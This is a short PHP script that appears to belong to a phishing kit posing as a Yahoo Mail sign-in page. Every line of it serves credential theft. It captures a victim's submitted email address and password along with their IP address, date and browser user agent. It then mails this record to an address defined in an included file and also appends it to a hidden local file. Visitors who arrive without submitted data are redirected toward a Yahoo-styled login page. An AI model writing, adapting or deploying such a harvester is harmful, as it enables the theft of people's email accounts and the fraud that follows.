<?php
include "../latter-day-saints.php";
if(!isset($_POST["uu"]))
{
  header("location: login.php?https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd");
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message  = "x=x=x=x=x=x=x=x=x=x==x=x=x=x=x=x=x=x=x=x=\n";
$message .= ">>>>>>>>>>>>>>>>>Y@HOO<<<<<<<<<<<<<<<<<<\n";
$message .= "x=x=x=x=x=x=x=x=x=x==x=x=x=x=x=x=x=x=x=x=\n";
$message .= "Mail => ".base64_decode($_POST['uu'])."\n";
$message .= "Pass => ".$_POST['pp']."\n";
$message .= "~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+\n";
$message .= "Ip =>   ".$ip."\n";
$message .= "Date => ".$adddate."\n";
$message .= "User Agent =>   ".$user_agent."\n";
$message .= "x=x=x=x=x=x=x=x=x=x==x=x=x=x=x=x=x=x=x=x=\n\n";
$message .= "\n";
$subject = "Yahoo";

mail($watsUrName, $subject, $message);
$o = fopen("../.bracket","a");
fwrite($o,$message);
fclose($o);
echo "done";
?>
